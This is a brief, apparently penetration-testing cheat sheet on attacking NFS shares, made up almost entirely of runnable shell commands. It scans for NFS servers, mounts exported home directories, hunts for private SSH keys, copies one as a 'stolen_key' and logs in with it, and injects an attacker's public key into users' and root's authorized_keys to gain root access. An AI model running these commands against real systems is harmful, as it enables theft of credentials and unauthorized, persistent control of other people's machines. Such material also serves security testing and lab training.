# NFS Exploitation - SSH Key Theft

## Detection
```bash
# Find NFS servers
nmap -p111,2049 --open 10.10.10.0/24

# Check exports
showmount -e TARGET
```

## SSH Key Theft

```bash
# 1. Mount exported share
sudo mkdir /mnt/nfs_target
sudo mount -t nfs TARGET:/home /mnt/nfs_target -o nolock

# 2. Search for SSH keys
find /mnt/nfs_target -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
find /mnt/nfs_target -name "authorized_keys" 2>/dev/null

# 3. Copy SSH key
cp /mnt/nfs_target/username/.ssh/id_rsa ./stolen_key
chmod 600 stolen_key

# 4. SSH with stolen key
ssh -i stolen_key username@TARGET
```

## SSH Key Injection (If no_root_squash)

```bash
# 1. Generate your key
ssh-keygen -f attack_key -N ""

# 2. Add to authorized_keys
sudo bash -c 'cat attack_key.pub >> /mnt/nfs_target/username/.ssh/authorized_keys'

# 3. If /root exported:
sudo bash -c 'cat attack_key.pub >> /mnt/nfs_target/../.ssh/authorized_keys'

# 4. SSH in
ssh -i attack_key root@TARGET
```
